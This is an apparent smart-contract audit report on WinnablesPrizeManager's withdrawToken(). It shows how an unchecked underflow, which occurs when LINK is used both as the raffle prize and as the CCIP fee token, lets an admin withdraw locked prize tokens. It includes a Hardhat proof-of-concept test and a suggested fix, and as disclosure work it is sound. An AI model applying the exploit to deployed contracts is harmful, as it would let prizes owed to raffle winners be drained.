# WinnablesPrizeManager.sol :: withdrawToken() if the raffle token is LINK, it can be stolen, resulting in the winner receiving nothing and the admin collecting the profits from ticket sales without any cost.

## Summary
**`withdrawToken()`** allows admins to withdraw tokens that aren't locked in the raffle. However, if LINK is used as the raffle token, it can be withdrawn, allowing it to be stolen and leaving the winner with nothing.
## Vulnerability Detail
**`withdrawToken()`** is implemented as follows.
```Solidity
function withdrawToken(address token, uint256 amount) external onlyRole(0) {
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        uint256 availableBalance;
@>      unchecked { availableBalance = tokenBalance - _tokensLocked[token]; }
        if (availableBalance < amount) revert InsufficientBalance();
        IERC20(token).safeTransfer(msg.sender, amount);
    }
```
As you can see, the **`availableBalance`** is calculated within an unchecked block, which means that if there's an over/underflow, the transaction won't revert. The issue arises when the raffle token is LINK, as this could cause an underflow due to the fee for **`_sendCCIPMessage()`** being paid in LINK.
```Solidity
function _sendCCIPMessage(
        address ccipDestAddress,
        uint64 ccipDestChainSelector,
        bytes memory data
    ) internal returns(bytes32 messageId) {
       ///...

        Client.EVM2AnyMessage memory message = Client.EVM2AnyMessage({
            receiver: abi.encode(ccipDestAddress),
            data: data,
            tokenAmounts: new Client.EVMTokenAmount[](0),
            extraArgs: "",
@>          feeToken: LINK_TOKEN 
        });

      ///...
    }
```
This causes an underflow when **`availableBalance = tokenBalance - _tokensLocked[token]`** if **`tokenBalance < _tokensLocked[token]`**, this is possible because the fees for the CCIP are paid with LINK. This underflow bypasses the **`if (availableBalance < amount) revert InsufficientBalance();`** check, allowing the tokens locked for the raffle to be stolen. 

The contest specifications explicitly state that admins cannot prevent a winner from withdrawing their prize.
> Winnables admins cannot do anything to prevent a winner from withdrawing their prize.

This issue allows the admin to bypass the rules, leading to a situation where people can purchase raffle tickets, but when a winner is selected, they are unable to withdraw their prize and the admin will collect the proceeds from ticket sales.
## POC
To reproduce the issue, copy the following POC into **`PrizeManager.js`**.
```js
it('Stealing locked tokens', async () => {
    //mint some LINK
    await (await link.connect(winnablesDeployer).mint(manager.address, ethers.utils.parseEther('100'))).wait();
    await (await token.connect(winnablesDeployer).mint(winnablesDeployer.address, 100)).wait();
    //send some LINK
    await (await link.transfer(manager.address, 100)).wait();

    const linkBalance = await link.balanceOf(manager.address);
    //lock LINK tokens for the raffle
    const tx = await manager.connect(winnablesDeployer).lockTokens(
      counterpartContractAddress,
      1,
      3,
      link.address,
      linkBalance
    );
    const { events } = await tx.wait();
    const ccipMessageEvent = ccipRouter.interface.parseLog(events[0]);
    expect(ccipMessageEvent.name).to.eq('MockCCIPMessageEvent');
    await expect(manager.getNFTRaffle(3)).to.be.revertedWithCustomError(manager, 'InvalidRaffle');
    await expect(manager.getETHRaffle(3)).to.be.revertedWithCustomError(manager, 'InvalidRaffle');
    const tokenInfo = await manager.getTokenRaffle(3);
    expect(tokenInfo.tokenAddress).to.eq(link.address);
    expect(tokenInfo.amount).to.eq(linkBalance);
    const prize = await manager.getRaffle(3);
    expect(prize.raffleType).to.eq(3);
    expect(prize.status).to.eq(0);
    expect(prize.winner).to.eq(ethers.constants.AddressZero);
    
    //steal LINK tokens blocked from the raffle
    await manager.withdrawToken(link.address, await link.balanceOf(manager.address));

    expect(await link.balanceOf(manager.address)).to.eq(0);  
  });
```
## Impact
Admins can steal the locked tokens from the raffle, preventing the winner from receiving anything and collecting the profits from ticket sales without any cost.

## Tool used
Manual Review.
## Recommendation
To resolve the issue, prohibit the creation of raffles using the LINK token in **`lockTokens()`**.
```diff
function lockTokens(
        address ticketManager,
        uint64 chainSelector,
        uint256 raffleId,
        address token,
        uint256 amount
    ) external onlyRole(0) {
+       if (token == LINK_TOKEN) revert LINKTokenNotPermitted();
        RafflePrize storage rafflePrize = _checkValidRaffle(raffleId);
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        if (tokenBalance < amount + _tokensLocked[token]) revert InvalidPrize();
        rafflePrize.raffleType = RaffleType.TOKEN;
        unchecked { _tokensLocked[token] += amount; }
        _tokenRaffles[raffleId].tokenAddress = token;
        _tokenRaffles[raffleId].amount = amount;

        _sendCCIPMessage(ticketManager, chainSelector, abi.encodePacked(raffleId));
        emit TokenPrizeLocked(raffleId, token, amount);
    }
```
